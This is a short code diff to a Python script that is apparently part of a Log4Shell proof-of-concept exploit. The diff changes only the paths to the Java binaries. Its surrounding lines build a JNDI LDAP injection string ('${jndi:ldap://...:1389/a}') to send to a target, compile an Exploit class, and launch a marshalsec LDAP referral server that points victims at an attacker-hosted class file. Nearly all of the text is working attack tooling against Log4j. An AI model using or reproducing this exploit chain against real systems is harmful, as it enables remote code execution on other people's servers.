@@ -89,7 +89,7 @@ public class Exploit {
 
 
 def checkJavaAvailible():
-  javaver = subprocess.call(['./jdk1.8.0_20/bin/java', '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+  javaver = subprocess.call(['./java', '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
   if(javaver != 0):
     print(Fore.RED + '[-] Java is not installed inside the repository ')
     sys.exit()
@@ -99,10 +99,10 @@ def createLdapServer(userip, lport):
   sendme = ("${jndi:ldap://%s:1389/a}") % (userip)
   print(Fore.GREEN +"[+] Send me: "+sendme+"\n")
 
-  subprocess.run(["./jdk1.8.0_20/bin/javac", "Exploit.java"])
+  subprocess.run(["./javac", "Exploit.java"])
 
   url = "http://{}:{}/#Exploit".format(userip, lport)
-  subprocess.run(["./jdk1.8.0_20/bin/java", "-cp",
+  subprocess.run(["./java", "-cp",
                  "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", url])
  
 
